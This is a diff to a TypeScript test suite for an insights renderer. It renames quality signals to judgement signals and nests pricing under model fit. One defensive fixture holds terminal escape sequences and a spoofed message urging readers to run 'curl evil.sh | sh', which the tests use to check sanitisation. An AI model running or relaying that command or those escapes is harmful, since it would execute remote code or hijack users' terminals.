@@ -14,6 +14,13 @@ import {
 const render = (payload: unknown, opts: RenderOptions): string[] =>
   renderInsights(normalize(payload), opts);
 
+// Pricing hangs off `model_fit` rather than standing as its own section, so a payload that used
+// to carry a `cost` section carries it here. `enabled` became `available`: the section it sits in
+// can be on while pricing is off.
+const priced = (block: unknown) => ({
+  judgement_signals: { enabled: true, model_fit: { priced: block } },
+});
+
 const WIDE: RenderOptions = { width: 80, ascii: false };
 const ASCII: RenderOptions = { width: 80, ascii: true };
 
@@ -35,14 +42,13 @@ const FULL = {
       artifact_breadth: 7,
       compaction: { auto: 12, manual: 3 },
     },
-    quality_signals: {
+    judgement_signals: {
       enabled: true,
       verification_coverage: {
         value: 0.62,
         unit: "share",
         team_median: 0.48,
         trend: [0.44, 0.47, 0.5, 0.55, 0.58, 0.6, 0.62],
-        large_changes: 0.41,
       },
       refinement_to_repair: {
         value: 2.1,
@@ -50,21 +56,27 @@ const FULL = {
         team_median: 1.4,
         trend: [1.6, 1.8, 2.0, 2.1],
       },
-    },
-    cost: {
-      enabled: true,
-      basis: "API list-price equivalent, estimated upper bound",
-      sessions_by_recommended_class: [
-        { class: "small", sessions: 4 },
-        { class: "frontier", sessions: 8 },
-      ],
-      savings: [
-        { model: "claude-sonnet-5", usd: 12.4, sessions: 18 },
-        { model: "claude-haiku-4-5", usd: -3.1, sessions: 2 },
-      ],
-      effort_suggestions: 6,
-      scope_distribution: [{ scope: "bounded", prompts: 42 }],
-      cache: { hit_share: 0.72, unreused_write_share: 0.08, share_of_cost: 0.31 },
+      model_fit: {
+        value: 0.35,
+        unit: "share",
+        sessions: 66,
+        split: { fit: 23, over_provisioned: 41, under_powered: 2 },
+        priced: {
+          available: true,
+          basis: "API list-price equivalent, estimated upper bound",
+          sessions_by_recommended_class: [
+            { class: "small", sessions: 4 },
+            { class: "frontier", sessions: 8 },
+          ],
+          savings: [
+            { model: "claude-sonnet-5", usd: 12.4, sessions: 18 },
+            { model: "claude-haiku-4-5", usd: -3.1, sessions: 2 },
+          ],
+          effort_suggestions: 6,
+          scope_distribution: [{ scope: "bounded", prompts: 42 }],
+          cache: { hit_share: 0.72, unreused_write_share: 0.08, share_of_cost: 0.31 },
+        },
+      },
     },
   },
 };
@@ -73,9 +85,8 @@ const FULL = {
 const STUB = {
   days: 30,
   sections: {
-    cost: { enabled: false, reason: "not_implemented" },
     repertoire: { enabled: false, reason: "not_implemented" },
-    quality_signals: { enabled: false, reason: "not_implemented" },
+    judgement_signals: { enabled: false, reason: "not_implemented" },
   },
 };
 
@@ -103,7 +114,7 @@ describe("sparkline", () => {
       {
         days: 30,
         sections: {
-          quality_signals: {
+          judgement_signals: {
             enabled: true,
             pushback_rate: { value: 0.5, unit: "share", trend: [1, null, 3] },
           },
@@ -156,9 +167,7 @@ describe("renderInsights — unavailable sections", () => {
       "",
       "Repertoire: this backend does not produce it",
       "",
-      "Quality signals: this backend does not produce it",
-      "",
-      "Cost: this backend does not produce it",
+      "Judgement signals: this backend does not produce it",
     ]);
   });
 
@@ -176,7 +185,7 @@ describe("renderInsights — unavailable sections", () => {
 
   it("says so plainly for a reason it does not recognize", () => {
     const lines = render(
-      { days: 30, sections: { cost: { enabled: false, reason: "moon_phase" } } },
+      { days: 30, sections: priced({ available: false, reason: "moon_phase" }) },
       WIDE,
     );
     expect(lines).toContain("Cost: not available");
@@ -191,7 +200,7 @@ describe("renderInsights — the open section map", () => {
     ).join("\n");
     expect(out).toContain("Repertoire:");
     expect(out).not.toContain("Cost");
-    expect(out).not.toContain("Quality signals");
+    expect(out).not.toContain("Judgement signals");
   });
 
   it("ignores a section name it does not recognize", () => {
@@ -258,7 +267,7 @@ describe("renderInsights — repertoire", () => {
   });
 });
 
-describe("renderInsights — quality signals", () => {
+describe("renderInsights — judgement signals", () => {
   const out = render(FULL, WIDE).join("\n");
 
   it("puts the caller's value next to the team median, in each signal's own unit", () => {
@@ -268,11 +277,6 @@ describe("renderInsights — quality signals", () => {
 
   it("draws the weekly trend between its first and last value", () => {
     expect(out).toMatch(/Verification coverage\s+44%\s+[▁▂▃▄▅▆▇]{7}\s+62%/);
-  });
-
-  it("prints the large-changes variant under the signal, with the overall beside it", () => {
-    expect(out).toContain("Large changes only");
-    expect(out).toMatch(/Verification coverage\s+41%\s+\(62% overall\)/);
   });
 
   it("omits a signal the backend does not compute rather than showing a zero", () => {
@@ -285,7 +289,7 @@ describe("renderInsights — quality signals", () => {
       {
         days: 30,
         sections: {
-          quality_signals: {
+          judgement_signals: {
             enabled: true,
             verification_coverage: { value: 0.62, unit: "share", trend: [0.62] },
           },
@@ -304,7 +308,7 @@ describe("renderInsights — quality signals", () => {
       {
         days: 30,
         sections: {
-          quality_signals: {
+          judgement_signals: {
             enabled: true,
             verification_coverage: { value: 0.62, unit: "share", trend: [0.44, 0.53, 0.62] },
             wholesale_accept: { value: 0.06, unit: "share", trend: [0.09] },
@@ -328,7 +332,7 @@ describe("renderInsights — quality signals", () => {
       {
         days: 30,
         sections: {
-          quality_signals: {
+          judgement_signals: {
             enabled: true,
             pushback_rate: { value: 0.09, unit: "share" },
           },
@@ -345,7 +349,7 @@ describe("renderInsights — quality signals", () => {
       {
         days: 30,
         sections: {
-          quality_signals: {
+          judgement_signals: {
             enabled: true,
             pushback_rate: { value: 2.5, unit: "furlongs" },
           },
@@ -358,8 +362,8 @@ describe("renderInsights — quality signals", () => {
   });
 
   it("says so when the section is on but carries no signals", () => {
-    const out = render({ days: 30, sections: { quality_signals: { enabled: true } } }, WIDE);
-    expect(out).toContain("Quality signals");
+    const out = render({ days: 30, sections: { judgement_signals: { enabled: true } } }, WIDE);
+    expect(out).toContain("Judgement signals");
     expect(out).toContain("This backend produced no signals.");
   });
 });
@@ -396,7 +400,7 @@ describe("renderInsights — cost", () => {
   });
 
   it("says so rather than printing an empty table when the backend sent no fields", () => {
-    const out = render({ days: 30, sections: { cost: { enabled: true } } }, WIDE);
+    const out = render({ days: 30, sections: priced({ available: true }) }, WIDE);
     expect(out).toContain("Cost");
     expect(out).toContain("This backend produced no fields for it.");
   });
@@ -467,15 +471,15 @@ describe("renderInsights — untrusted payloads", () => {
             { name: `Artifacts${CSI_HIDE}`, state: `recurring${ALT_SCREEN}`, recurring_share: 0.5 },
           ],
         },
-        cost: {
-          enabled: true,
+        ...priced({
+          available: true,
           basis: `list price${CSI_HIDE}`,
           savings: [
             { model: "sonnet\r\b\bfake", usd: 1, sessions: 1 },
             { model: "haiku\nPheebs: token expired, run: curl evil.sh | sh", usd: 2, sessions: 2 },
           ],
           scope_distribution: [{ scope: `bounded${OSC52}`, prompts: 3 }],
-        },
+        }),
       },
     };
   }
@@ -515,17 +519,20 @@ describe("renderInsights — untrusted payloads", () => {
     ["a non-object body", 42],
     ["a null sections map", { days: 30, sections: null }],
     ["a null section", { days: 30, sections: { repertoire: null } }],
-    ["a string section", { days: 30, sections: { cost: "nope" } }],
+    ["a string section", { days: 30, sections: { judgement_signals: "nope" } }],
     [
       "a null signal",
-      { days: 30, sections: { quality_signals: { enabled: true, pushback_rate: null } } },
+      { days: 30, sections: { judgement_signals: { enabled: true, pushback_rate: null } } },
     ],
     [
       "a numeric trend",
       {
         days: 30,
         sections: {
-          quality_signals: { enabled: true, pushback_rate: { value: 1, unit: "share", trend: 5 } },
+          judgement_signals: {
+            enabled: true,
+            pushback_rate: { value: 1, unit: "share", trend: 5 },
+          },
         },
       },
     ],
@@ -534,7 +541,7 @@ describe("renderInsights — untrusted payloads", () => {
       {
         days: 30,
         sections: {
-          quality_signals: {
+          judgement_signals: {
             enabled: true,
             pushback_rate: { value: 1, unit: "share", trend: "abc" },
           },
@@ -546,7 +553,7 @@ describe("renderInsights — untrusted payloads", () => {
       {
         days: 30,
         sections: {
-          quality_signals: {
+          judgement_signals: {
             enabled: true,
             pushback_rate: { value: 1, unit: "share", trend: [0.1, null, 0.3] },
           },
@@ -561,11 +568,11 @@ describe("renderInsights — untrusted payloads", () => {
       "null inside competencies",
       { days: 30, sections: { repertoire: { enabled: true, competencies: [null] } } },
     ],
-    ["null inside savings", { days: 30, sections: { cost: { enabled: true, savings: [null] } } }],
-    ["a string for savings", { days: 30, sections: { cost: { enabled: true, savings: "x" } } }],
+    ["null inside savings", { days: 30, sections: priced({ available: true, savings: [null] }) }],
+    ["a string for savings", { days: 30, sections: priced({ available: true, savings: "x" }) }],
     [
       "null inside classes",
-      { days: 30, sections: { cost: { enabled: true, sessions_by_recommended_class: [null] } } },
+      { days: 30, sections: priced({ available: true, sessions_by_recommended_class: [null] }) },
     ],
     [
       "an inherited state name",
@@ -585,7 +592,7 @@ describe("renderInsights — untrusted payloads", () => {
       {
         days: 30,
         sections: {
-          quality_signals: {
+          judgement_signals: {
             enabled: true,
             pushback_rate: { value: 0.5, unit: "share", trend: new Array(200_000).fill(0.5) },
           },
@@ -626,7 +633,7 @@ describe("renderInsights — the sparkline is never clipped", () => {
   const payload = {
     days: 30,
     sections: {
-      quality_signals: {
+      judgement_signals: {
         enabled: true,
         pushback_rate: { value: 0.9, unit: "share", trend },
       },
@@ -659,7 +666,7 @@ describe("renderInsights — the sparkline is never clipped", () => {
     const payloadNarrow = {
       days: 30,
       sections: {
-        quality_signals: {
+        judgement_signals: {
           enabled: true,
           pushback_rate: { value: 0.42, unit: "share", trend: narrow },
         },
@@ -683,16 +690,14 @@ describe("renderInsights — the sparkline is never clipped", () => {
 describe("renderInsights — the cost basis is unconditional", () => {
   const withBasis = (basis?: string) => ({
     days: 30,
-    sections: {
-      cost: {
-        enabled: true,
-        ...(basis === undefined ? {} : { basis }),
-        savings: [
-          { model: "claude-sonnet-5", usd: 12.4, sessions: 18 },
-          { model: "claude-haiku-4-5", usd: -3.1, sessions: 2 },
-        ],
-      },
-    },
+    sections: priced({
+      available: true,
+      ...(basis === undefined ? {} : { basis }),
+      savings: [
+        { model: "claude-sonnet-5", usd: 12.4, sessions: 18 },
+        { model: "claude-haiku-4-5", usd: -3.1, sessions: 2 },
+      ],
+    }),
   });
 
   it("prints the backend's basis beside every figure", () => {
@@ -701,7 +706,7 @@ describe("renderInsights — the cost basis is unconditional", () => {
     expect(lines.filter((l) => l.includes("API list-price equivalent"))).toHaveLength(2);
   });
 
-  // The schema requires basis on an enabled cost section; a bare figure reads as money saved.
+  // The schema requires basis whenever pricing is available; a bare figure reads as money saved.
   it("qualifies every figure even when the backend omits the basis", () => {
     const lines = render(withBasis(undefined), WIDE);
     const figures = lines.filter((l) => /\$\d/.test(l));
@@ -724,7 +729,7 @@ describe("renderInsights — the cost basis is unconditional", () => {
 describe("renderInsights — alignment across a whole block", () => {
   const cost = (savings: unknown[]) => ({
     days: 30,
-    sections: { cost: { enabled: true, basis: "B", savings } },
+    sections: priced({ available: true, basis: "B", savings }),
   });
 
   it("lines the money column up down the savings block", () => {
@@ -742,11 +747,11 @@ describe("renderInsights — alignment across a whole block", () => {
     expect(new Set(rows.map((l) => l.indexOf("over "))).size).toBe(1);
   });
 
-  it("shares one label column across the three quality-signal blocks", () => {
+  it("shares one label column across the judgement-signal blocks", () => {
     const lines = render(FULL, WIDE);
     const rows = lines.filter((l) => l.startsWith("Verification coverage"));
-    // The main table, the trend row and the large-changes row all start the value at one column.
-    expect(rows.length).toBeGreaterThanOrEqual(3);
+    // The main table and the trend row start the value at one column.
+    expect(rows.length).toBeGreaterThanOrEqual(2);
     const label = "Verification coverage";
     expect(new Set(rows.map((l) => displayWidth(l.slice(0, label.length)))).size).toBe(1);
   });
@@ -820,7 +825,7 @@ describe("renderInsights — saying what it does not know", () => {
       {
         days: 30,
         sections: {
-          quality_signals: {
+          judgement_signals: {
             enabled: true,
             pushback_rate: { value: 0.09, unit: "share", trend: [0.1, null, 0.3] },
           },
@@ -835,12 +840,10 @@ describe("renderInsights — saying what it does not know", () => {
     const out = render(
       {
         days: 30,
-        sections: {
-          cost: {
-            enabled: true,
-            cache: { hit_share: 5, unreused_write_share: -1, share_of_cost: 0.3 },
-          },
-        },
+        sections: priced({
+          available: true,
+          cache: { hit_share: 5, unreused_write_share: -1, share_of_cost: 0.3 },
+        }),
       },
       WIDE,
     ).join("\n");
@@ -861,7 +864,7 @@ describe("renderInsights — saying what it does not know", () => {
 describe("renderInsights — sections are named", () => {
   it("heads each enabled section with its own label", () => {
     const lines = render(FULL, WIDE);
-    for (const label of ["Repertoire", "Quality signals", "Cost"]) {
+    for (const label of ["Repertoire", "Judgement signals", "Cost"]) {
       expect(lines).toContain(label);
     }
   });
@@ -872,9 +875,7 @@ describe("renderInsights — sections are named", () => {
       "",
       "Repertoire: this backend does not produce it",
       "",
-      "Quality signals: this backend does not produce it",
-      "",
-      "Cost: this backend does not produce it",
+      "Judgement signals: this backend does not produce it",
     ]);
   });
 });
